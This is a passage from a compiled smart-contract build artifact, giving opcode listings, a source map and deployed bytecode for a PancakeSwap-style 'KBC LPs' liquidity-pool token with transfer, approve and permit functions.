KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x622 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x658 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x6A9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x6B4 DUP10 DUP10 DUP10 PUSH2 0x6DC JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x7B7 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x7EC SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x848 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xF6 PUSH30 0x2FCB41C2924B09964A6438469181DD9DCBF870211C842940F1534AE0DCED PUSH5 0x736F6C6343 STOP SDIV LT STOP ORIGIN GASLIMIT 0x49 POP CALLDATACOPY BALANCE ORIGIN DIFFICULTY PUSH16 0x6D61696E28737472696E67206E616D65 0x2C PUSH20 0x7472696E672076657273696F6E2C75696E743235 CALLDATASIZE KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 ",
							"sourceMap": "111:4330:0:-;;;1017:485;8:9:-1;5:2;;;30:1;27;20:12;5:2;-1:-1;1203:133:0;;1107:7;;1203:133;;;;;;;;;;;;;;;;1370:4;;;;;;;;-1:-1:-1;;;1370:4:0;;;;;1404:10;;;;;;;;;;-1:-1:-1;;;1404:10:0;;;;1175:310;;;;;;;;;1354:22;1175:310;;;;1394:21;1175:310;;;;;;;;;;;1466:4;1175:310;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;1175:310:0;;;;;;1152:343;;;;;;;;1133:16;:362;-1:-1:-1;111:4330:0;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100ea5760003560e01c806347d5d8561161008c57806395d89b411161006657806395d89b411461029c578063a9059cbb146102a4578063d505accf146102d0578063dd62ed3e14610323576100ea565b806347d5d8561461022a57806370a08231146102505780637ecebe0014610276576100ea565b806323b872dd116100c857806323b872dd146101c657806330adf81f146101fc578063313ce567146102045780633644e51514610222576100ea565b806306fdde03146100ef578063095ea7b31461016c57806318160ddd146101ac575b600080fd5b6100f7610351565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610131578181015183820152602001610119565b50505050905090810190601f16801561015e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101986004803603604081101561018257600080fd5b506001600160a01b038135169060200135610374565b604080519115158252519081900360200190f35b6101b461038b565b60408051918252519081900360200190f35b610198600480360360608110156101dc57600080fd5b506001600160a01b03813581169160208101359091169060400135610391565b6101b461042b565b61020c61044f565b6040805160ff9092168252519081900360200190f35b6101b4610454565b6101b46004803603602081101561024057600080fd5b50356001600160a01b031661045a565b6101b46004803603602081101561026657600080fd5b50356001600160a01b031661046c565b6101b46004803603602081101561028c57600080fd5b50356001600160a01b031661047e565b6100f7610490565b610198600480360360408110156102ba57600080fd5b506001600160a01b0381351690602001356104b2565b610321600480360360e08110156102e657600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c001356104bf565b005b6101b46004803603604081101561033957600080fd5b506001600160a01b03813581169160200135166106bf565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b60006103813384846106dc565b5060015b92915050565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610416576001600160a01b03841660009081526002602090815260408083203384529091529020546103f1908363ffffffff61073e16565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b61042184848461078e565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b60016020526000908152604090205481565b60056020526000908152604090205481565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b600061038133848461078e565b42841015610507576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa158015610622573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906106585750886001600160a01b0316816001600160a01b0316145b6106a9576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b6106b48989896106dc565b505050505050505050565b600260209081526000928352604080842090915290825290205481565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b80820382811115610385576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160a01b0383166000908152600160205260409020546107b7908263ffffffff61073e16565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546107ec908263ffffffff61084816565b6001600160a01b0380841660008181526001602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b80820182811015610385576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfea265627a7a72315820f67d2fcb41c2924b09964a6438469181dd9dcbf870211c842940f1534ae0dced64736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xEA JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x47D5D856 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x95D89B41 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x29C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2A4 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x2D0 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x323 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x22A JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x276 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xC8 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1C6 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x1FC JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x222 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1AC JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xF7 PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x131 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x15E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x182 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x38B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x391 JUMP JUMPDEST PUSH2 0x1B4 PUSH2 0x42B JUMP JUMPDEST PUSH2 0x20C PUSH2 0x44F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x454 JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x45A JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x46C JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x28C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x47E JUMP JUMPDEST PUSH2 0xF7 PUSH2 0x490 JUMP JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x4B2 JUMP JUMPDEST PUSH2 0x321 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x4BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x339 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x6DC JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0x416 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0x3F1 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0x421 DUP5 DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x507 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x622 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x658 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x6A9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x6B4 DUP10 DUP10 DUP10 PUSH2 0x6DC JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x7B7 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x7EC SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x848 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xF6 PUSH30 0x2FCB41C2924B09964A6438469181DD9DCBF870211C842940F1534AE0DCED PUSH5 0x736F6C6343 STOP SDIV LT STOP ORIGIN ",
